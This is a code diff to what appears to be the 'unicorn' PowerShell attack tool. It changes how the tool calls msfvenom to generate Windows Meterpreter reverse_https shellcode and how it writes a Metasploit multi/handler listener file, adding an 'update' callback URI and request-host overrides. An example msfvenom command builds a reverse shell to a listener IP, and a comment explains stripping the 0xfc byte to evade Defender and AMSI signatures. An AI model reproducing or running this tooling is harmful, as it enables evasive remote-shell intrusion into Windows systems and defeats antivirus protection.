@@ -725,7 +725,7 @@ def format_metasploit(data):
     if len(data) < 1:
         #print("[!] Shellcode was not generated for some reason. Check payload name and if Metasploit is working and try again.")
         print("[!] Critical: It does not appear that your shellcode is formatted properly. Shellcode should be in a 0x00,0x01 format or a Metasploit format.")
-        print("[!] Example: msfvenom -p LHOST=192.168.5.5 LPORT=443 -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -f c")
+        print("[!] Example: msfvenom -p LHOST=192.168.5.5 LPORT=443 LURI=update -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai -f c")
         print("Exiting....")
         sys.exit()
 
@@ -783,7 +783,7 @@ def generate_shellcode(payload, ipaddr, port):
         # gen random number for length
         uri_length=generate_random_number(3,6)
 
-        proc = subprocess.Popen("msfvenom -p {0} {1} {2} --platform windows --smallest -f c".format(payload, ipaddr, port, uri_length), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
+        proc = subprocess.Popen("msfvenom -p {0} {1} {2} LURI=update --platform windows --smallest -f c".format(payload, ipaddr, port, uri_length), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
         data = proc.communicate()[0]
         # If you are reading through the code, you might be scratching your head as to why I replace the first 0xfc (CLD) from the beginning of the Metasploit meterpreter payload. Defender writes signatures here and there for unicorn, and this time they decided to look for 0xfc in the decoded (base64) code through AMSI. Interesting enough in all my testing, we shouldn't need a clear direction flag and the shellcode works fine. If you notice any issues, you can simply just make a variable like $a='0xfc'; at the beginning of the command and add a $a at the beginning of the shellcode which also evades. Easier to just remove if we don't need which makes the payload 4 bytes smaller anyways.
         #data = data.decode("ascii").replace('"\\xfc', '"', 1)
@@ -818,7 +818,7 @@ def gen_shellcode_attack(payload, ipaddr, port):
         # if we aren't using download/exec
         if not "url=" in ipaddr:
             # write out rc file
-            write_file("unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n".format(payload, ipaddr, port))
+            write_file("unicorn.rc", "use multi/handler\nset payload {0}\nset LHOST {1}\nset LPORT {2}\nset LURI update\nset ExitOnSession false\nset EnableStageEncoding true\nset OverrideRequestHost true\nset OverrideScheme https\nexploit -j\n".format(payload, ipaddr, port))
 
     # switch variable to be shellcode for formatting
     if ipaddr == "cobaltstrike": shellcode = payload
